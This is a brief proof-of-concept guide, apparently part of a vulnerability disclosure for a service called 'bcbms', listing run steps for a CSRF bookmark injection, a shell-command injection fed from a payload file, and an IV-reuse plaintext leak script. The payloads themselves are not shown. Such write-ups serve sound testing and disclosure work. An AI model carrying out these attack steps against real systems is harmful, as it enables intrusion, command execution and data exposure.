# Proof‑of‑Concept Guide

## 1  CSRF Bookmark Injection
sudo ./bcbms &          # start cloud service
xdg-open poc/inject.html
# ⇒ Bookmark 'evil.com' silently inserted.

## 2  Shell‑Command Injection
curl "$(cat poc/cmd_inject.txt)"
# ⇒ File 'hacked' created (or chosen payload runs).

## 3  IV‑Reuse Plaintext Leak
python3 poc/xor_leak.py
# ⇒ Script prints XOR’d plaintext bytes from two archives.

## Notes
* Clean up with `pkill bcbms` if you backgrounded the server.
